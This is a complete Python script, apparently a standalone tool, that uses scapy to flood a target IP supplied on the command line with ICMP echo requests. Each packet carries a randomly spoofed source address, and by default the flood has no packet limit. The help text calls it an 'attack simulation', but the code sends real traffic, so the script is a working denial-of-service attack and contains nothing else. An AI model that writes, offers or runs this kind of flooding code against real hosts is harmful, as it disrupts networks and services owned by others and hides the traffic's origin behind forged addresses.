import argparse
from scapy.all import *

def icmp_flood(target_ip, packet_count=None):
    sent_count = 0
    while packet_count is None or sent_count < packet_count:
        # Generate a random source IP
        src_ip = RandIP()  # Random source IP
        # Create the ICMP Echo Request packet
        icmp_packet = IP(src=src_ip, dst=target_ip) / ICMP()
        send(icmp_packet, verbose=False)
        sent_count += 1
        if packet_count is None:
            print(f"Sent {sent_count} ICMP packets to {target_ip}")
        else:
            print(f"Sent {sent_count}/{packet_count} ICMP packets to {target_ip}")

    print("Packet sending complete!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ICMP flood attack simulation")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument(
        "-c", "--count", 
        type=int, 
        default=None, 
        help="Number of packets to send (default: unlimited)"
    )
    args = parser.parse_args()

    target_ip = args.target_ip
    packet_count = args.count

    icmp_flood(target_ip, packet_count)

